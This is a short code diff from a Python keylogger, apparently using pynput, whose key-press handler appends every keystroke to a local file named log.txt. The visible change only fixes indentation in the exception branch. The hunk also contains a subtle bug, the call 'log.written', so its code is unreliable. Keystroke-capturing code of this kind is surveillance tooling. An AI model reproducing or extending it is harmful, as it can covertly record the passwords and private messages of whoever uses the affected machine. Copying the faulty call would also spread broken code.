@@ -13,11 +13,12 @@ def on_press(key):
     with open("log.txt","a") as log:
         try:
             log.written(f"{key.char}")
+
         except AttributeError:
- 	    if key == Key.space:
- 	        log.write(" ")
- 	    else:
- 	        log.write(f"{key}")
+            if key == Key.space:
+                log.write(" ")
+            else:
+                log.write(f"{key}")
 
 def on_release(key):
     if key == Key.esc:
